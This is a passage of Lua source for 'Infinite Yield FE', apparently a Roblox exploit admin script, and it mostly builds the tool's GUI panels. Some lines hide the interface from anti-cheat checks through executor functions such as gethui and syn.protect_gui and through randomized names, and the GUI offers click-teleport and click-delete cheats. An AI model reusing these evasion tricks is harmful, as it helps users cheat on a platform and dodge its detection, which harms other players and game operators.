	Dark_2 = Instance.new("Frame")
	Img = Instance.new("ImageButton")
	AddPlugin = Instance.new("TextButton")
	FileName = Instance.new("TextBox")
	About = Instance.new("TextLabel")
	Directions_2 = Instance.new("TextLabel")
	shadow_3 = Instance.new("Frame")
	PopupText_3 = Instance.new("TextLabel")
	Exit_3 = Instance.new("TextButton")
	ExitImage_3 = Instance.new("ImageLabel")
	AliasHint = Instance.new("TextLabel")
	PluginsHint = Instance.new("TextLabel")
	PositionsHint = Instance.new("TextLabel")
	ToPartFrame = Instance.new("Frame")
	background_4 = Instance.new("Frame")
	ChoosePart = Instance.new("TextButton")
	CopyPath = Instance.new("TextButton")
	Directions_3 = Instance.new("TextLabel")
	Path = Instance.new("TextLabel")
	shadow_4 = Instance.new("Frame")
	PopupText_5 = Instance.new("TextLabel")
	Exit_4 = Instance.new("TextButton")
	ExitImage_5 = Instance.new("ImageLabel")
	logs = Instance.new("Frame")
	shadow = Instance.new("Frame")
	Hide = Instance.new("TextButton")
	ImageLabel = Instance.new("ImageLabel")
	PopupText = Instance.new("TextLabel")
	Exit = Instance.new("TextButton")
	ImageLabel_2 = Instance.new("ImageLabel")
	background = Instance.new("Frame")
	chat = Instance.new("Frame")
	Clear = Instance.new("TextButton")
	SaveChatlogs = Instance.new("TextButton")
	Toggle = Instance.new("TextButton")
	scroll_2 = Instance.new("ScrollingFrame")
	join = Instance.new("Frame")
	Toggle_2 = Instance.new("TextButton")
	Clear_2 = Instance.new("TextButton")
	scroll_3 = Instance.new("ScrollingFrame")
	listlayout = Instance.new("UIListLayout",scroll_3)
	selectChat = Instance.new("TextButton")
	selectJoin = Instance.new("TextButton")

	function randomString()
		local length = math.random(10,20)
		local array = {}
		for i = 1, length do
			array[i] = string.char(math.random(32, 126))
		end
		return table.concat(array)
	end

	PARENT = nil
	if get_hidden_gui or gethui then
		local hiddenUI = get_hidden_gui or gethui
		local Main = Instance.new("ScreenGui")
		Main.Name = randomString()
		Main.Parent = hiddenUI()
		PARENT = Main
	elseif (not is_sirhurt_closure) and (syn and syn.protect_gui) then
		local Main = Instance.new("ScreenGui")
		Main.Name = randomString()
		syn.protect_gui(Main)
		Main.Parent = COREGUI
		PARENT = Main
	elseif COREGUI:FindFirstChild('RobloxGui') then
		PARENT = COREGUI.RobloxGui
	else
		local Main = Instance.new("ScreenGui")
		Main.Name = randomString()
		Main.Parent = COREGUI
		PARENT = Main
	end

	shade1 = {}
	shade2 = {}
	shade3 = {}
	text1 = {}
	text2 = {}
	scroll = {}

	Holder.Name = randomString()
	Holder.Parent = PARENT
	Holder.Active = true
	Holder.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Holder.BorderSizePixel = 0
	Holder.Position = UDim2.new(1, -250, 1, -220)
	Holder.Size = UDim2.new(0, 250, 0, 220)
	Holder.ZIndex = 10
	table.insert(shade2,Holder)

	Title.Name = "Title"
	Title.Parent = Holder
	Title.Active = true
	Title.BackgroundColor3 = Color3.fromRGB(36,36,37)
	Title.BorderSizePixel = 0
	Title.Size = UDim2.new(0, 250, 0, 20)
	Title.Font = Enum.Font.SourceSans
	Title.TextSize = 18
	Title.Text = "Infinite Yield FE v" .. currentVersion

	do
		local emoji = ({
			["01 01"] = "🎆",
			[(function(Year)
				local A = math.floor(Year/100)
				local B = math.floor((13+8*A)/25)
				local C = (15-B+A-math.floor(A/4))%30
				local D = (4+A-math.floor(A/4))%7
				local E = (19*(Year%19)+C)%30
				local F = (2*(Year%4)+4*(Year%7)+6*E+D)%7
				local G = (22+E+F)
				if E == 29 and F == 6 then
					return "04 19"
				elseif E == 28 and F == 6 then
					return "04 18"
				elseif 31 < G then
					return ("04 %02d"):format(G-31)
				end
				return ("03 %02d"):format(G)
			end)(tonumber(os.date"%Y"))] = "🥚",
			["10 31"] = "🎃",
			["12 25"] = "🎄"
		})[os.date("%m %d")]
		if emoji then
			Title.Text = ("%s %s %s"):format(emoji, Title.Text, emoji)
		end
	end

	Title.TextColor3 = Color3.new(1, 1, 1)
	Title.ZIndex = 10
	table.insert(shade1,Title)
	table.insert(text1,Title)

	Dark.Name = "Dark"
	Dark.Parent = Holder
	Dark.Active = true
	Dark.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
	Dark.BorderSizePixel = 0
	Dark.Position = UDim2.new(0, 0, 0, 45)
	Dark.Size = UDim2.new(0, 250, 0, 175)
	Dark.ZIndex = 10
	table.insert(shade1,Dark)

	Cmdbar.Name = "Cmdbar"
	Cmdbar.Parent = Holder
	Cmdbar.BackgroundTransparency = 1
	Cmdbar.BorderSizePixel = 0
	Cmdbar.Position = UDim2.new(0, 5, 0, 20)
	Cmdbar.Size = UDim2.new(0, 240, 0, 25)
	Cmdbar.Font = Enum.Font.SourceSans
	Cmdbar.TextSize = 18
	Cmdbar.TextXAlignment = Enum.TextXAlignment.Left
	Cmdbar.TextColor3 = Color3.new(1, 1, 1)
	Cmdbar.Text = ""
	Cmdbar.ZIndex = 10
	Cmdbar.PlaceholderText = "Command Bar"

	CMDsF.Name = "CMDs"
	CMDsF.Parent = Holder
	CMDsF.BackgroundTransparency = 1
	CMDsF.BorderSizePixel = 0
	CMDsF.Position = UDim2.new(0, 5, 0, 45)
	CMDsF.Size = UDim2.new(0, 245, 0, 175)
	CMDsF.ScrollBarImageColor3 = Color3.fromRGB(78,78,79)
	CMDsF.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	CMDsF.CanvasSize = UDim2.new(0, 0, 0, 0)
	CMDsF.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	CMDsF.ScrollBarThickness = 8
	CMDsF.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	CMDsF.VerticalScrollBarInset = 'Always'
	CMDsF.ZIndex = 10
	table.insert(scroll,CMDsF)

	cmdListLayout.Parent = CMDsF

	SettingsButton.Name = "SettingsButton"
	SettingsButton.Parent = Holder
	SettingsButton.BackgroundTransparency = 1
	SettingsButton.Position = UDim2.new(0, 230, 0, 0)
	SettingsButton.Size = UDim2.new(0, 20, 0, 20)
	SettingsButton.Image = "rbxassetid://1204397029"
	SettingsButton.ZIndex = 10

	ReferenceButton = Instance.new("ImageButton")
	ReferenceButton.Name = "ReferenceButton"
	ReferenceButton.Parent = Holder
	ReferenceButton.BackgroundTransparency = 1
	ReferenceButton.Position = UDim2.new(0, 212, 0, 2)
	ReferenceButton.Size = UDim2.new(0, 16, 0, 16)
	ReferenceButton.Image = "rbxassetid://3523243755"
	ReferenceButton.ZIndex = 10

	Settings.Name = "Settings"
	Settings.Parent = Holder
	Settings.Active = true
	Settings.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
	Settings.BorderSizePixel = 0
	Settings.Position = UDim2.new(0, 0, 0, 220)
	Settings.Size = UDim2.new(0, 250, 0, 175)
	Settings.ZIndex = 10
	table.insert(shade1,Settings)

	SettingsHolder = Instance.new("ScrollingFrame")
	SettingsHolder.Name = "Holder"
	SettingsHolder.Parent = Settings
	SettingsHolder.BackgroundTransparency = 1
	SettingsHolder.BorderSizePixel = 0
	SettingsHolder.Size = UDim2.new(1,0,1,0)
	SettingsHolder.ScrollBarImageColor3 = Color3.fromRGB(78,78,79)
	SettingsHolder.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	SettingsHolder.CanvasSize = UDim2.new(0, 0, 0, 235)
	SettingsHolder.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	SettingsHolder.ScrollBarThickness = 8
	SettingsHolder.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	SettingsHolder.VerticalScrollBarInset = 'Always'
	SettingsHolder.ZIndex = 10
	table.insert(scroll,SettingsHolder)

	Prefix.Name = "Prefix"
	Prefix.Parent = SettingsHolder
	Prefix.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Prefix.BorderSizePixel = 0
	Prefix.BackgroundTransparency = 1
	Prefix.Position = UDim2.new(0, 5, 0, 5)
	Prefix.Size = UDim2.new(1, -10, 0, 20)
	Prefix.Font = Enum.Font.SourceSans
	Prefix.TextSize = 14
	Prefix.Text = "Prefix"
	Prefix.TextColor3 = Color3.new(1, 1, 1)
	Prefix.TextXAlignment = Enum.TextXAlignment.Left
	Prefix.ZIndex = 10
	table.insert(shade2,Prefix)
	table.insert(text1,Prefix)

	PrefixBox.Name = "PrefixBox"
	PrefixBox.Parent = Prefix
	PrefixBox.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	PrefixBox.BorderSizePixel = 0
	PrefixBox.Position = UDim2.new(1, -20, 0, 0)
	PrefixBox.Size = UDim2.new(0, 20, 0, 20)
	PrefixBox.Font = Enum.Font.SourceSansBold
	PrefixBox.TextSize = 14
	PrefixBox.Text = ''
	PrefixBox.TextColor3 = Color3.new(0, 0, 0)
	PrefixBox.ZIndex = 10
	table.insert(shade3,PrefixBox)
	table.insert(text2,PrefixBox)

	function makeSettingsButton(name,iconID,off)
		local button = Instance.new("TextButton")
		button.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		button.BorderSizePixel = 0
		button.Position = UDim2.new(0,0,0,0)
		button.Size = UDim2.new(1,0,0,25)
		button.Text = ""
		button.ZIndex = 10
		local icon = Instance.new("ImageLabel")
		icon.Name = "Icon"
		icon.Parent = button
		icon.Position = UDim2.new(0,5,0,5)
		icon.Size = UDim2.new(0,16,0,16)
		icon.BackgroundTransparency = 1
		icon.Image = iconID
		icon.ZIndex = 10
		if off then
			icon.ScaleType = Enum.ScaleType.Crop
			icon.ImageRectSize = Vector2.new(16,16)
			icon.ImageRectOffset = Vector2.new(off,0)
		end
		local label = Instance.new("TextLabel")
		label.Name = "ButtonLabel"
		label.Parent = button
		label.BackgroundTransparency = 1
		label.Text = name
		label.Position = UDim2.new(0,28,0,0)
		label.Size = UDim2.new(1,-28,1,0)
		label.Font = Enum.Font.SourceSans
		label.TextColor3 = Color3.new(1, 1, 1)
		label.TextSize = 14
		label.ZIndex = 10
		label.TextXAlignment = Enum.TextXAlignment.Left
		table.insert(shade2,button)
		table.insert(text1,label)
		return button
	end

	ColorsButton = makeSettingsButton("Edit Theme","rbxassetid://4911962991")
	ColorsButton.Position = UDim2.new(0,5,0,55)
	ColorsButton.Size = UDim2.new(1,-10,0,25)
	ColorsButton.Name = "Colors"
	ColorsButton.Parent = SettingsHolder

	Keybinds = makeSettingsButton("Edit Keybinds","rbxassetid://129697930")
	Keybinds.Position = UDim2.new(0, 5, 0, 85)
	Keybinds.Size = UDim2.new(1, -10, 0, 25)
	Keybinds.Name = "Keybinds"
	Keybinds.Parent = SettingsHolder

	Aliases = makeSettingsButton("Edit Aliases","rbxassetid://5147488658")
	Aliases.Position = UDim2.new(0, 5, 0, 115)
	Aliases.Size = UDim2.new(1, -10, 0, 25)
	Aliases.Name = "Aliases"
	Aliases.Parent = SettingsHolder

	StayOpen.Name = "StayOpen"
	StayOpen.Parent = SettingsHolder
	StayOpen.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	StayOpen.BorderSizePixel = 0
	StayOpen.BackgroundTransparency = 1
	StayOpen.Position = UDim2.new(0, 5, 0, 30)
	StayOpen.Size = UDim2.new(1, -10, 0, 20)
	StayOpen.Font = Enum.Font.SourceSans
	StayOpen.TextSize = 14
	StayOpen.Text = "Keep Menu Open"
	StayOpen.TextColor3 = Color3.new(1, 1, 1)
	StayOpen.TextXAlignment = Enum.TextXAlignment.Left
	StayOpen.ZIndex = 10
	table.insert(shade2,StayOpen)
	table.insert(text1,StayOpen)

	Button.Name = "Button"
	Button.Parent = StayOpen
	Button.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Button.BorderSizePixel = 0
	Button.Position = UDim2.new(1, -20, 0, 0)
	Button.Size = UDim2.new(0, 20, 0, 20)
	Button.ZIndex = 10
	table.insert(shade3,Button)

	On.Name = "On"
	On.Parent = Button
	On.BackgroundColor3 = Color3.fromRGB(150, 150, 151)
	On.BackgroundTransparency = 1
	On.BorderSizePixel = 0
	On.Position = UDim2.new(0, 2, 0, 2)
	On.Size = UDim2.new(0, 16, 0, 16)
	On.Font = Enum.Font.SourceSans
	On.FontSize = Enum.FontSize.Size14
	On.Text = ""
	On.TextColor3 = Color3.new(0, 0, 0)
	On.ZIndex = 10

	Positions = makeSettingsButton("Edit/Goto Waypoints","rbxassetid://5147488592")
	Positions.Position = UDim2.new(0, 5, 0, 145)
	Positions.Size = UDim2.new(1, -10, 0, 25)
	Positions.Name = "Waypoints"
	Positions.Parent = SettingsHolder

	EventBind = makeSettingsButton("Edit Event Binds","rbxassetid://5147695474",759)
	EventBind.Position = UDim2.new(0, 5, 0, 205)
	EventBind.Size = UDim2.new(1, -10, 0, 25)
	EventBind.Name = "EventBinds"
	EventBind.Parent = SettingsHolder

	Plugins = makeSettingsButton("Manage Plugins","rbxassetid://5147695474",743)
	Plugins.Position = UDim2.new(0, 5, 0, 175)
	Plugins.Size = UDim2.new(1, -10, 0, 25)
	Plugins.Name = "Plugins"
	Plugins.Parent = SettingsHolder

	Example.Name = "Example"
	Example.Parent = Holder
	Example.BackgroundTransparency = 1
	Example.BorderSizePixel = 0
	Example.Size = UDim2.new(0, 190, 0, 20)
	Example.Visible = false
	Example.Font = Enum.Font.SourceSans
	Example.TextSize = 18
	Example.Text = "Example"
	Example.TextColor3 = Color3.new(1, 1, 1)
	Example.TextXAlignment = Enum.TextXAlignment.Left
	Example.ZIndex = 10
	table.insert(text1,Example)

	Notification.Name = randomString()
	Notification.Parent = PARENT
	Notification.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
	Notification.BorderSizePixel = 0
	Notification.Position = UDim2.new(1, -500, 1, 20)
	Notification.Size = UDim2.new(0, 250, 0, 100)
	Notification.ZIndex = 10
	table.insert(shade1,Notification)

	Title_2.Name = "Title"
	Title_2.Parent = Notification
	Title_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Title_2.BorderSizePixel = 0
	Title_2.Size = UDim2.new(0, 250, 0, 20)
	Title_2.Font = Enum.Font.SourceSans
	Title_2.TextSize = 14
	Title_2.Text = "Notification Title"
	Title_2.TextColor3 = Color3.new(1, 1, 1)
	Title_2.ZIndex = 10
	table.insert(shade2,Title_2)
	table.insert(text1,Title_2)

	Text_2.Name = "Text"
	Text_2.Parent = Notification
	Text_2.BackgroundTransparency = 1
	Text_2.BorderSizePixel = 0
	Text_2.Position = UDim2.new(0, 5, 0, 25)
	Text_2.Size = UDim2.new(0, 240, 0, 75)
	Text_2.Font = Enum.Font.SourceSans
	Text_2.TextSize = 16
	Text_2.Text = "Notification Text"
	Text_2.TextColor3 = Color3.new(1, 1, 1)
	Text_2.TextWrapped = true
	Text_2.ZIndex = 10
	table.insert(text1,Text_2)

	CloseButton.Name = "CloseButton"
	CloseButton.Parent = Notification
	CloseButton.BackgroundTransparency = 1
	CloseButton.Position = UDim2.new(1, -20, 0, 0)
	CloseButton.Size = UDim2.new(0, 20, 0, 20)
	CloseButton.Text = ""
	CloseButton.ZIndex = 10

	CloseImage.Parent = CloseButton
	CloseImage.BackgroundColor3 = Color3.new(1, 1, 1)
	CloseImage.BackgroundTransparency = 1
	CloseImage.Position = UDim2.new(0, 5, 0, 5)
	CloseImage.Size = UDim2.new(0, 10, 0, 10)
	CloseImage.Image = "rbxassetid://5054663650"
	CloseImage.ZIndex = 10

	PinButton.Name = "PinButton"
	PinButton.Parent = Notification
	PinButton.BackgroundTransparency = 1
	PinButton.Size = UDim2.new(0, 20, 0, 20)
	PinButton.ZIndex = 10
	PinButton.Text = ""

	PinImage.Parent = PinButton
	PinImage.BackgroundColor3 = Color3.new(1, 1, 1)
	PinImage.BackgroundTransparency = 1
	PinImage.Position = UDim2.new(0, 3, 0, 3)
	PinImage.Size = UDim2.new(0, 14, 0, 14)
	PinImage.ZIndex = 10
	PinImage.Image = "rbxassetid://6234691350"

	Tooltip.Name = randomString()
	Tooltip.Parent = PARENT
	Tooltip.Active = true
	Tooltip.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
	Tooltip.BackgroundTransparency = 0.1
	Tooltip.BorderSizePixel = 0
	Tooltip.Size = UDim2.new(0, 200, 0, 96)
	Tooltip.Visible = false
	Tooltip.ZIndex = 10
	table.insert(shade1,Tooltip)

	Title_3.Name = "Title"
	Title_3.Parent = Tooltip
	Title_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Title_3.BackgroundTransparency = 0.1
	Title_3.BorderSizePixel = 0
	Title_3.Size = UDim2.new(0, 200, 0, 20)
	Title_3.Font = Enum.Font.SourceSans
	Title_3.TextSize = 14
	Title_3.Text = ""
	Title_3.TextColor3 = Color3.new(1, 1, 1)
	Title_3.TextTransparency = 0.1
	Title_3.ZIndex = 10
	table.insert(shade2,Title_3)
	table.insert(text1,Title_3)

	Description.Name = "Description"
	Description.Parent = Tooltip
	Description.BackgroundTransparency = 1
	Description.BorderSizePixel = 0
	Description.Size = UDim2.new(0,180,0,72)
	Description.Position = UDim2.new(0,10,0,18)
	Description.Font = Enum.Font.SourceSans
	Description.TextSize = 16
	Description.Text = ""
	Description.TextColor3 = Color3.new(1, 1, 1)
	Description.TextTransparency = 0.1
	Description.TextWrapped = true
	Description.ZIndex = 10
	table.insert(text1,Description)

	IntroBackground.Name = "IntroBackground"
	IntroBackground.Parent = Holder
	IntroBackground.Active = true
	IntroBackground.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
	IntroBackground.BorderSizePixel = 0
	IntroBackground.Position = UDim2.new(0, 0, 0, 45)
	IntroBackground.Size = UDim2.new(0, 250, 0, 175)
	IntroBackground.ZIndex = 10

	Logo.Name = "Logo"
	Logo.Parent = Holder
	Logo.BackgroundTransparency = 1
	Logo.BorderSizePixel = 0
	Logo.Position = UDim2.new(0, 125, 0, 127)
	Logo.Size = UDim2.new(0, 10, 0, 10)
	Logo.Image = "rbxassetid://1352543873"
	Logo.ImageTransparency = 0
	Logo.ZIndex = 10

	Credits.Name = "Credits"
	Credits.Parent = Holder
	Credits.BackgroundTransparency = 1
	Credits.BorderSizePixel = 0
	Credits.Position = UDim2.new(0, 0, 0.9, 30)
	Credits.Size = UDim2.new(0, 250, 0, 20)
	Credits.Font = Enum.Font.SourceSansLight
	Credits.FontSize = Enum.FontSize.Size18
	Credits.Text = "Edge // Zwolf // Moon // Toon"
	Credits.TextColor3 = Color3.new(1, 1, 1)
	Credits.ZIndex = 10

	KeybindsFrame.Name = "KeybindsFrame"
	KeybindsFrame.Parent = Settings
	KeybindsFrame.Active = true
	KeybindsFrame.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
	KeybindsFrame.BorderSizePixel = 0
	KeybindsFrame.Position = UDim2.new(0, 0, 0, 175)
	KeybindsFrame.Size = UDim2.new(0, 250, 0, 175)
	KeybindsFrame.ZIndex = 10
	table.insert(shade1,KeybindsFrame)

	Close.Name = "Close"
	Close.Parent = KeybindsFrame
	Close.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Close.BorderSizePixel = 0
	Close.Position = UDim2.new(0, 205, 0, 150)
	Close.Size = UDim2.new(0, 40, 0, 20)
	Close.Font = Enum.Font.SourceSans
	Close.TextSize = 14
	Close.Text = "Close"
	Close.TextColor3 = Color3.new(1, 1, 1)
	Close.ZIndex = 10
	table.insert(shade2,Close)
	table.insert(text1,Close)

	Add.Name = "Add"
	Add.Parent = KeybindsFrame
	Add.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Add.BorderSizePixel = 0
	Add.Position = UDim2.new(0, 5, 0, 150)
	Add.Size = UDim2.new(0, 40, 0, 20)
	Add.Font = Enum.Font.SourceSans
	Add.TextSize = 14
	Add.Text = "Add"
	Add.TextColor3 = Color3.new(1, 1, 1)
	Add.ZIndex = 10
	table.insert(shade2,Add)
	table.insert(text1,Add)

	Delete.Name = "Delete"
	Delete.Parent = KeybindsFrame
	Delete.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Delete.BorderSizePixel = 0
	Delete.Position = UDim2.new(0, 50, 0, 150)
	Delete.Size = UDim2.new(0, 40, 0, 20)
	Delete.Font = Enum.Font.SourceSans
	Delete.TextSize = 14
	Delete.Text = "Clear"
	Delete.TextColor3 = Color3.new(1, 1, 1)
	Delete.ZIndex = 10
	table.insert(shade2,Delete)
	table.insert(text1,Delete)

	Holder_2.Name = "Holder"
	Holder_2.Parent = KeybindsFrame
	Holder_2.BackgroundTransparency = 1
	Holder_2.BorderSizePixel = 0
	Holder_2.Position = UDim2.new(0, 0, 0, 0)
	Holder_2.Size = UDim2.new(0, 250, 0, 145)
	Holder_2.ScrollBarImageColor3 = Color3.fromRGB(78,78,79)
	Holder_2.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Holder_2.CanvasSize = UDim2.new(0, 0, 0, 0)
	Holder_2.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Holder_2.ScrollBarThickness = 0
	Holder_2.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Holder_2.VerticalScrollBarInset = 'Always'
	Holder_2.ZIndex = 10

	Example_2.Name = "Example"
	Example_2.Parent = KeybindsFrame
	Example_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Example_2.BorderSizePixel = 0
	Example_2.Size = UDim2.new(0, 10, 0, 20)
	Example_2.Visible = false
	Example_2.ZIndex = 10
	table.insert(shade2,Example_2)

	Text_3.Name = "Text"
	Text_3.Parent = Example_2
	Text_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Text_3.BorderSizePixel = 0
	Text_3.Position = UDim2.new(0, 10, 0, 0)
	Text_3.Size = UDim2.new(0, 240, 0, 20)
	Text_3.Font = Enum.Font.SourceSans
	Text_3.TextSize = 14
	Text_3.Text = "nom"
	Text_3.TextColor3 = Color3.new(1, 1, 1)
	Text_3.TextXAlignment = Enum.TextXAlignment.Left
	Text_3.ZIndex = 10
	table.insert(shade2,Text_3)
	table.insert(text1,Text_3)

	Delete_2.Name = "Delete"
	Delete_2.Parent = Text_3
	Delete_2.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Delete_2.BorderSizePixel = 0
	Delete_2.Position = UDim2.new(0, 200, 0, 0)
	Delete_2.Size = UDim2.new(0, 40, 0, 20)
	Delete_2.Font = Enum.Font.SourceSans
	Delete_2.TextSize = 14
	Delete_2.Text = "Delete"
	Delete_2.TextColor3 = Color3.new(0, 0, 0)
	Delete_2.ZIndex = 10
	table.insert(shade3,Delete_2)
	table.insert(text2,Delete_2)

	KeybindEditor.Name = randomString()
	KeybindEditor.Parent = PARENT
	KeybindEditor.Active = true
	KeybindEditor.BackgroundTransparency = 1
	KeybindEditor.Position = UDim2.new(0.5, -180, 0, -500)
	KeybindEditor.Size = UDim2.new(0, 360, 0, 20)
	KeybindEditor.ZIndex = 10

	background_2.Name = "background"
	background_2.Parent = KeybindEditor
	background_2.Active = true
	background_2.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
	background_2.BorderSizePixel = 0
	background_2.Position = UDim2.new(0, 0, 0, 20)
	background_2.Size = UDim2.new(0, 360, 0, 185)
	background_2.ZIndex = 10
	table.insert(shade1,background_2)

	Dark_3.Name = "Dark"
	Dark_3.Parent = background_2
	Dark_3.Active = true
	Dark_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Dark_3.BorderSizePixel = 0
	Dark_3.Position = UDim2.new(0, 135, 0, 0)
	Dark_3.Size = UDim2.new(0, 2, 0, 185)
	Dark_3.ZIndex = 10
	table.insert(shade2,Dark_3)

	Directions.Name = "Directions"
	Directions.Parent = background_2
	Directions.BackgroundTransparency = 1
	Directions.BorderSizePixel = 0
	Directions.Position = UDim2.new(0, 10, 0, 15)
	Directions.Size = UDim2.new(0, 115, 0, 90)
	Directions.ZIndex = 10
	Directions.Font = Enum.Font.SourceSans
	Directions.Text = "Click the button below and press a key/mouse button. Then select what you want to bind it to."
	Directions.TextColor3 = Color3.fromRGB(255, 255, 255)
	Directions.TextSize = 14.000
	Directions.TextWrapped = true
	Directions.TextYAlignment = Enum.TextYAlignment.Top
	table.insert(text1,Directions)

	BindTo.Name = "BindTo"
	BindTo.Parent = background_2
	BindTo.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	BindTo.BorderSizePixel = 0
	BindTo.Position = UDim2.new(0, 10, 0, 95)
	BindTo.Size = UDim2.new(0, 115, 0, 50)
	BindTo.ZIndex = 10
	BindTo.Font = Enum.Font.SourceSans
	BindTo.Text = "Click to bind"
	BindTo.TextColor3 = Color3.fromRGB(255, 255, 255)
	BindTo.TextSize = 16.000
	table.insert(shade2,BindTo)
	table.insert(text1,BindTo)

	TriggerLabel.Name = "TriggerLabel"
	TriggerLabel.Parent = background_2
	TriggerLabel.BackgroundTransparency = 1
	TriggerLabel.Position = UDim2.new(0, 10, 0, 155)
	TriggerLabel.Size = UDim2.new(0, 45, 0, 20)
	TriggerLabel.ZIndex = 10
	TriggerLabel.Font = Enum.Font.SourceSans
	TriggerLabel.Text = "Trigger:"
	TriggerLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	TriggerLabel.TextSize = 14.000
	TriggerLabel.TextXAlignment = Enum.TextXAlignment.Left
	table.insert(text1,TriggerLabel)

	BindTriggerSelect.Name = "BindTo"
	BindTriggerSelect.Parent = background_2
	BindTriggerSelect.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	BindTriggerSelect.BorderSizePixel = 0
	BindTriggerSelect.Position = UDim2.new(0, 60, 0, 155)
	BindTriggerSelect.Size = UDim2.new(0, 65, 0, 20)
	BindTriggerSelect.ZIndex = 10
	BindTriggerSelect.Font = Enum.Font.SourceSans
	BindTriggerSelect.Text = "KeyDown"
	BindTriggerSelect.TextColor3 = Color3.fromRGB(255, 255, 255)
	BindTriggerSelect.TextSize = 16.000
	table.insert(shade2,BindTriggerSelect)
	table.insert(text1,BindTriggerSelect)

	Add_2.Name = "Add"
	Add_2.Parent = background_2
	Add_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Add_2.BorderSizePixel = 0
	Add_2.Position = UDim2.new(0, 310, 0, 35)
	Add_2.Size = UDim2.new(0, 40, 0, 20)
	Add_2.ZIndex = 10
	Add_2.Font = Enum.Font.SourceSans
	Add_2.Text = "Add"
	Add_2.TextColor3 = Color3.fromRGB(255, 255, 255)
	Add_2.TextSize = 14.000
	table.insert(shade2,Add_2)
	table.insert(text1,Add_2)

	Toggles.Name = "Toggles"
	Toggles.Parent = background_2
	Toggles.BackgroundTransparency = 1
	Toggles.BorderSizePixel = 0
	Toggles.Position = UDim2.new(0, 150, 0, 125)
	Toggles.Size = UDim2.new(0, 200, 0, 50)
	Toggles.ZIndex = 10
	Toggles.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Toggles.CanvasSize = UDim2.new(0, 0, 0, 50)
	Toggles.ScrollBarThickness = 8
	Toggles.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Toggles.VerticalScrollBarInset = Enum.ScrollBarInset.Always
	table.insert(scroll,Toggles)

	ClickTP.Name = "Click TP (Hold Key & Click)"
	ClickTP.Parent = Toggles
	ClickTP.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	ClickTP.BorderSizePixel = 0
	ClickTP.Size = UDim2.new(0, 200, 0, 20)
	ClickTP.ZIndex = 10
	ClickTP.Font = Enum.Font.SourceSans
	ClickTP.Text = "    Click TP (Hold Key & Click)"
	ClickTP.TextColor3 = Color3.fromRGB(255, 255, 255)
	ClickTP.TextSize = 14.000
	ClickTP.TextXAlignment = Enum.TextXAlignment.Left
	table.insert(shade2,ClickTP)
	table.insert(text1,ClickTP)

	Select.Name = "Select"
	Select.Parent = ClickTP
	Select.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Select.BorderSizePixel = 0
	Select.Position = UDim2.new(0, 160, 0, 0)
	Select.Size = UDim2.new(0, 40, 0, 20)
	Select.ZIndex = 10
	Select.Font = Enum.Font.SourceSans
	Select.Text = "Add"
	Select.TextColor3 = Color3.fromRGB(0, 0, 0)
	Select.TextSize = 14.000
	table.insert(shade3,Select)
	table.insert(text2,Select)

	ClickDelete.Name = "Click Delete (Hold Key & Click)"
	ClickDelete.Parent = Toggles
	ClickDelete.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	ClickDelete.BorderSizePixel = 0
	ClickDelete.Position = UDim2.new(0, 0, 0, 25)
	ClickDelete.Size = UDim2.new(0, 200, 0, 20)
	ClickDelete.ZIndex = 10
	ClickDelete.Font = Enum.Font.SourceSans
	ClickDelete.Text = "    Click Delete (Hold Key & Click)"
	ClickDelete.TextColor3 = Color3.fromRGB(255, 255, 255)
	ClickDelete.TextSize = 14.000
	ClickDelete.TextXAlignment = Enum.TextXAlignment.Left
	table.insert(shade2,ClickDelete)
	table.insert(text1,ClickDelete)

	Select_2.Name = "Select"
	Select_2.Parent = ClickDelete
	Select_2.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Select_2.BorderSizePixel = 0
	Select_2.Position = UDim2.new(0, 160, 0, 0)
	Select_2.Size = UDim2.new(0, 40, 0, 20)
	Select_2.ZIndex = 10
	Select_2.Font = Enum.Font.SourceSans
	Select_2.Text = "Add"
	Select_2.TextColor3 = Color3.fromRGB(0, 0, 0)
	Select_2.TextSize = 14.000
	table.insert(shade3,Select_2)
	table.insert(text2,Select_2)

	Cmdbar_2.Name = "Cmdbar_2"
	Cmdbar_2.Parent = background_2
	Cmdbar_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Cmdbar_2.BorderSizePixel = 0
	Cmdbar_2.Position = UDim2.new(0, 150, 0, 35)
	Cmdbar_2.Size = UDim2.new(0, 150, 0, 20)
	Cmdbar_2.ZIndex = 10
